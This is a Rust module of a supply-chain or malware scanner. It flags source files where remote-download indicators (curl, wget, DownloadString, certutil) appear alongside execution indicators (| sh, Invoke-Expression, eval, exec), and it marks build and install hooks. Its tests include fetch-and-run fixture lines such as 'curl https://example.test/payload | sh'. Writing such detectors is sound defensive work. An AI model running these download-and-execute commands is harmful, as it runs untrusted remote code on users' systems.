use crate::model::{Confidence, Finding, Severity};
use std::path::Path;

const MAX_SOURCE_BYTES: usize = 16 * 1024 * 1024;

pub struct Analysis {
    pub language: Option<String>,
    pub findings: Vec<Finding>,
    pub incomplete_reasons: Vec<String>,
}

pub fn analyze(path: &str, text: Option<&str>) -> Analysis {
    let language = language(path);
    let mut result = Analysis {
        language: language.map(str::to_owned),
        findings: Vec::new(),
        incomplete_reasons: Vec::new(),
    };
    let Some(language) = language else {
        return result;
    };
    let Some(text) = text else {
        result
            .incomplete_reasons
            .push(format!("cannot decode {language} source: {path}"));
        return result;
    };
    if text.len() > MAX_SOURCE_BYTES {
        result.incomplete_reasons.push(format!(
            "{language} source exceeds {MAX_SOURCE_BYTES} byte analysis limit: {path}"
        ));
        return result;
    }
    let source = text.to_ascii_lowercase();
    let patterns = patterns(language);
    let matched_sources = patterns
        .sources
        .iter()
        .filter(|indicator| source.contains(**indicator))
        .copied()
        .collect::<Vec<_>>();
    let matched_sinks = patterns
        .sinks
        .iter()
        .filter(|indicator| source.contains(**indicator))
        .copied()
        .collect::<Vec<_>>();
    if !matched_sources.is_empty() && !matched_sinks.is_empty() {
        let direct = matched_sources.iter().any(|source| {
            matched_sinks.iter().any(|sink| {
                source == sink
                    || source == &"downloadstring" && sink == &"invoke-expression"
                    || source == &"curl" && (sink == &"| sh" || sink == &"| bash")
            })
        });
        let id = if direct {
            "LANG-REMOTE-DOWNLOAD-EXECUTE"
        } else {
            "LANG-REMOTE-DATA-EXECUTION-CAPABILITY"
        };
        result.findings.push(Finding {
            id: id.to_owned(),
            severity: if direct { Severity::High } else { Severity::Medium },
            confidence: if direct { Confidence::High } else { Confidence::Medium },
            score: if direct { 85 } else { 60 },
            title: if direct {
                "Remote content is directly piped or passed to execution"
            } else {
                "Remote input and execution capabilities occur in one source file"
            }
            .to_owned(),
            message: format!(
                "The {language} source contains both remote-input and execution indicators; this bounded text analysis does not prove runtime data flow."
            ),
            file: Some(path.to_owned()),
            line: first_line(text, matched_sources[0]),
            evidence: vec![
                format!("remote-input indicator: {}", matched_sources.join(", ")),
                format!("execution indicator: {}", matched_sinks.join(", ")),
            ],
        });
    }
    if is_execution_root(path, language, &source) {
        result.findings.push(Finding {
            id: "LANG-EXECUTION-ROOT".to_owned(),
            severity: Severity::Informational,
            confidence: Confidence::High,
            score: 10,
            title: format!("{language} build or package hook is an execution root"),
            message:
                "The file can run automatically during build, packaging, or developer-tool startup."
                    .to_owned(),
            file: Some(path.to_owned()),
            line: None,
            evidence: vec![format!("recognized execution-root path: {path}")],
        });
    }
    result
}

struct Patterns {
    sources: &'static [&'static str],
    sinks: &'static [&'static str],
}

fn patterns(language: &str) -> Patterns {
    match language {
        "shell" => Patterns {
            sources: &["curl", "wget", "invoke-webrequest", "downloadstring"],
            sinks: &["| sh", "| bash", "invoke-expression", "bash -c", "sh -c"],
        },
        "powershell" => Patterns {
            sources: &["invoke-webrequest", "downloadstring", "start-bitstransfer"],
            sinks: &[
                "invoke-expression",
                "iex ",
                "start-process",
                "scriptblock::create",
            ],
        },
        "batch" => Patterns {
            sources: &["certutil", "bitsadmin", "curl", "powershell -command"],
            sinks: &["start ", "call ", "cmd /c", "-encodedcommand"],
        },
        "python" => Patterns {
            sources: &["requests.get", "urllib.request", "urlopen(", "httpx.get"],
            sinks: &["exec(", "eval(", "subprocess.", "os.system("],
        },
        "rust" => Patterns {
            sources: &[
                "reqwest::get",
                "ureq::get",
                "hyper::client",
                "tcpstream::connect",
            ],
            sinks: &["process::command", "command::new", ".spawn(", ".output("],
        },
        "go" => Patterns {
            sources: &["http.get(", "http.newrequest", "client.do(", "net.dial("],
            sinks: &["exec.command(", "commandcontext(", ".start(", ".run("],
        },
        "php" => Patterns {
            sources: &["curl_exec(", "file_get_contents(", "fopen("],
            sinks: &["eval(", "shell_exec(", "proc_open(", "system("],
        },
        "ruby" => Patterns {
            sources: &["net::http", "open-uri", "http.get("],
            sinks: &["kernel.system", "system(", "exec(", "open3.capture"],
        },
        "java" => Patterns {
            sources: &["httpclient", "url.openconnection", "httpurlconnection"],
            sinks: &["processbuilder", "runtime.getruntime().exec", " .start("],
        },
        "dotnet" => Patterns {
            sources: &[
                "httpclient",
                "webclient",
                "downloadstring(",
                "downloadfile(",
            ],
            sinks: &["process.start(", "powershell", "assembly.load("],
        },
        _ => Patterns {
            sources: &[],
            sinks: &[],
        },
    }
}

fn language(path: &str) -> Option<&'static str> {
    let normalized = path.replace('\\', "/");
    let basename = normalized.rsplit('/').next().unwrap_or(&normalized);
    if basename == "setup.py" || basename == "pyproject.toml" {
        return Some("python");
    }
    if basename == "build.rs" || normalized == ".cargo/config" || normalized == ".cargo/config.toml"
    {
        return Some("rust");
    }
    if basename == "extconf.rb" || basename.ends_with(".gemspec") {
        return Some("ruby");
    }
    if basename == "composer.json" {
        return Some("php");
    }
    if basename == "pom.xml" {
        return Some("java");
    }
    match Path::new(basename)
        .extension()
        .and_then(|value| value.to_str())
    {
        Some("sh" | "bash" | "zsh" | "fish") => Some("shell"),
        Some("ps1" | "psm1" | "psd1") => Some("powershell"),
        Some("bat" | "cmd") => Some("batch"),
        Some("py" | "pyw") => Some("python"),
        Some("rs") => Some("rust"),
        Some("go") => Some("go"),
        Some("php") => Some("php"),
        Some("rb") => Some("ruby"),
        Some("java" | "gradle" | "kts") => Some("java"),
        Some("cs" | "csproj" | "props" | "targets") => Some("dotnet"),
        _ => None,
    }
}

fn is_execution_root(path: &str, language: &str, source: &str) -> bool {
    let basename = path.rsplit('/').next().unwrap_or(path);
    match language {
        "python" => {
            basename == "setup.py"
                || basename == "pyproject.toml" && source.contains("build-backend")
        }
        "rust" => {
            basename == "build.rs"
                || source.contains("rustc-wrapper")
                || source.contains("runner =")
        }
        "ruby" => basename == "extconf.rb" || basename.ends_with(".gemspec"),
        "php" => basename == "composer.json" && source.contains("\"scripts\""),
        "java" => matches!(basename, "build.gradle" | "build.gradle.kts" | "pom.xml"),
        "go" => source
            .lines()
            .any(|line| line.trim_start().starts_with("//go:generate")),
        "dotnet" => {
            matches!(
                Path::new(basename)
                    .extension()
                    .and_then(|value| value.to_str()),
                Some("csproj" | "props" | "targets")
            ) && source.contains("<target")
        }
        "shell" => matches!(basename, "install.sh" | "setup.sh" | "build.sh"),
        "powershell" => matches!(basename, "install.ps1" | "setup.ps1" | "build.ps1"),
        "batch" => matches!(basename, "install.bat" | "setup.cmd" | "build.cmd"),
        _ => false,
    }
}

fn first_line(text: &str, indicator: &str) -> Option<u64> {
    text.lines()
        .position(|line| line.to_ascii_lowercase().contains(indicator))
        .map(|index| index as u64 + 1)
}

#[cfg(test)]
mod tests {
    use super::analyze;

    #[test]
    fn recognizes_bounded_remote_to_execution_patterns_across_languages() {
        let fixtures = [
            ("install.sh", "curl https://example.test/payload | sh"),
            ("install.ps1", "DownloadString Invoke-Expression"),
            ("install.bat", "certutil payload start payload.exe"),
            ("setup.py", "requests.get(url)\nexec(payload)"),
            (
                "build.rs",
                "reqwest::get(url); std::process::Command::new(bin)",
            ),
            ("main.go", "http.Get(url); exec.Command(bin).Run()"),
            ("loader.php", "file_get_contents(url); eval($payload)"),
            ("loader.rb", "Net::HTTP.get(uri); Kernel.system(payload)"),
            (
                "Main.java",
                "HttpClient client; new ProcessBuilder(payload).start()",
            ),
            ("Build.cs", "HttpClient client; Process.Start(payload)"),
        ];
        for (path, source) in fixtures {
            let analysis = analyze(path, Some(source));
            assert!(
                analysis
                    .findings
                    .iter()
                    .any(|finding| finding.id.starts_with("LANG-REMOTE")),
                "{path}"
            );
            assert!(analysis.language.is_some(), "{path}");
        }
    }

    #[test]
    fn ignores_unrelated_text_and_detects_split_line_markers() {
        assert!(
            analyze("main.py", Some("print('hello')"))
                .findings
                .is_empty()
        );
        let analysis = analyze("main.py", Some("requests.get(url)\n# later\nexec(payload)"));
        assert!(
            analysis
                .findings
                .iter()
                .any(|finding| finding.id.starts_with("LANG-REMOTE"))
        );
    }
}
